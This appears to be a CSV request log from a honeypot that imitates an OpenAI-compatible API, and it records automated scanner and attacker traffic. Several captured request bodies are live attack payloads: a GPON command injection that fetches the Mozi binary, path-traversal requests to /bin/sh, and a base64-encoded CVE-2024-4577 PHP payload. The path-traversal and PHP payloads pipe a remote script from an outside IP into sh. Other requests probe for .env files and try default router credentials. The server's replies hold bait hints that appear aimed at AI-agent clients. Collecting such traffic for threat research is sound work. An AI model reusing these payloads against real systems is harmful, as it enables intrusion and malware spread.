request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
9a8cf040-86de-44db-b068-d44beb60517d,2026-04-16T02:25:47.665095+00:00,anon_e7ebd3af,POST,/GponForm/diag_Form,[honeypot-host],"Hello, World",,118,316,1,,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://118.253.80.63:48921/Mozi.m+-O+->/tmp/gpon80;,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://118.253.80.63:48921/Mozi.m+-O+->/tmp/gpon80;,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a29bc448-137b-46bb-aadd-f1aae309f90f,2026-04-16T02:34:40.805340+00:00,anon_38934f4e,GET,/hudson,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d2f32ada-9a0d-40f7-a13c-44502884b147,2026-04-16T02:44:07.346393+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,85,36,1,gpt-4o,user:HI,"{""model"": ""gpt-4o"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",404,Not Found,"{""error"":""model 'gpt-4o' not found""}",4,
e9165613-346c-4dca-b9c0-7c7cf30f4c2f,2026-04-16T02:44:07.577780+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,90,41,1,gpt-4-turbo,user:HI,"{""model"": ""gpt-4-turbo"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",404,Not Found,"{""error"":""model 'gpt-4-turbo' not found""}",2,
b9b1d2e3-dcd1-4d9b-8e54-8555552e67cc,2026-04-16T02:44:07.821403+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,92,43,1,claude-3-opus,user:HI,"{""model"": ""claude-3-opus"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",404,Not Found,"{""error"":""model 'claude-3-opus' not found""}",1,
d64b1b68-7575-4060-aa95-0bcdcb8f878a,2026-04-16T02:44:08.078121+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,90,41,1,llama-3-70b,user:HI,"{""model"": ""llama-3-70b"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",404,Not Found,"{""error"":""model 'llama-3-70b' not found""}",1,
fb227442-f987-4f77-9a05-ead12bbf286f,2026-04-16T02:44:08.598487+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,98,49,1,gpt-4o-preview-safe,user:HI,"{""model"": ""gpt-4o-preview-safe"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",404,Not Found,"{""error"":""model 'gpt-4o-preview-safe' not found""}",2,
19d9b81c-b130-4403-90cf-e827264a6375,2026-04-16T02:44:08.867897+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,104,55,1,gpt-4o-mini-tools-preview,user:HI,"{""model"": ""gpt-4o-mini-tools-preview"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",404,Not Found,"{""error"":""model 'gpt-4o-mini-tools-preview' not found""}",1,
eabda14c-0002-4d3b-a728-b80be342111f,2026-04-16T02:44:13.887841+00:00,anon_2c7fa316,POST,/v1/chat/completions,[honeypot-host],Go-http-client/1.1,,92,336,1,qwen-research,user:HI,"{""model"": ""qwen-research"", ""messages"": [{""content"": ""HI"", ""role"": ""user""}], ""stream"": false}",200,OK,"{""model"":""qwen-research"",""created_at"":""2026-04-16T02:44:13.883126256Z"",""message"":{""role"":""assistant"",""content"":""Hello! How can I assist you today?""},""done"":true,""done_reason"":""stop"",""total_duration"":5532153451,""load_duration"":3356206685,""prompt_eval_count"":72,""prompt_eval_duration"":1511757502,""eval_count"":10,""eval_duration"":612356477}",5537,
9c67249a-48dc-4b14-85f9-3b561d3dc79b,2026-04-16T02:54:45.770797+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
dc47b07a-5616-4f76-a522-b2102d49697f,2026-04-16T02:55:25.189611+00:00,anon_48c8ac11,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
83e22577-03a2-4553-9781-a10cfd691b75,2026-04-16T03:07:45.146705+00:00,anon_640de9e1,GET,/,,"osee2unifiedRelease/1466 osee2unifiedReleaseVersion/6.9.1 Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
c55ad004-288b-4611-9b60-40076acef755,2026-04-16T03:18:18.762556+00:00,anon_3ba9f865,POST,/boaform/admin/formLogin,[honeypot-host],Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,29,316,1,,username=admin&psd=Feefifofum,username=admin&psd=Feefifofum,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b6565620-2bbb-4c7d-bc51-e65a5ca837bf,2026-04-16T03:23:41.021227+00:00,anon_3c857440,GET,/,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
4dba7c86-5fa4-4699-aa79-947eb0db2c0e,2026-04-16T04:04:44.382604+00:00,anon_e1e5b879,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
38952e7d-4b9f-48e3-b150-a0dc2c268824,2026-04-16T04:11:12.148734+00:00,anon_d180a667,GET,/.env,[honeypot-host],SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
900ea9ce-b8a5-4381-9b14-8247785d7203,2026-04-16T04:38:54.363138+00:00,anon_e6650463,GET,/.env,[honeypot-host],Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
09c8cdb8-9980-4974-ab41-ea18fd81cf6d,2026-04-16T04:39:27.970571+00:00,anon_4179c767,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
6006fed8-1804-40a7-a5cb-d551ed8c41a5,2026-04-16T04:54:37.197894+00:00,anon_da2a3ece,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
bfa423db-3445-4b51-ae29-fc9cb44334cc,2026-04-16T04:57:05.764772+00:00,anon_3ba9f865,POST,/boaform/admin/formLogin,[honeypot-host],Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,29,316,1,,username=admin&psd=Feefifofum,username=admin&psd=Feefifofum,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0e63f10b-bbe7-4786-9aff-b58bc68c7d09,2026-04-16T05:03:02.645855+00:00,anon_5f4c059f,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
79c6f32d-5db4-4447-bbf0-f8f759a7f153,2026-04-16T05:05:54.750576+00:00,anon_35e3443a,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
69f04ec4-79e2-4199-8745-6e6cb47ced97,2026-04-16T05:07:29.962887+00:00,anon_5f4c059f,GET,/geoserver/web/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
25e99758-0b16-4e46-a5a1-a1247a21b35e,2026-04-16T05:21:57.827443+00:00,anon_62fd0fae,GET,/,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
eef1f9ec-a180-4e4c-8f1f-97dc5aea5254,2026-04-16T05:31:12.370610+00:00,anon_844b38e6,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b5ab593e-8d6f-4b45-b824-edda45cd984a,2026-04-16T05:31:13.228233+00:00,anon_844b38e6,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2a00cad9-282a-4cd8-8496-4ca6aabd7c7e,2026-04-16T05:31:14.098523+00:00,anon_844b38e6,POST,/hello.world,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vNDYuMTUxLjE4Mi44Mi9zaCB8fCBjdXJsIC1zayBodHRwczovLzQ2LjE1MS4xODIuODIvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vNDYuMTUxLjE4Mi44Mi9zaCB8fCBjdXJsIC1zayBodHRwczovLzQ2LjE1MS4xODIuODIvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
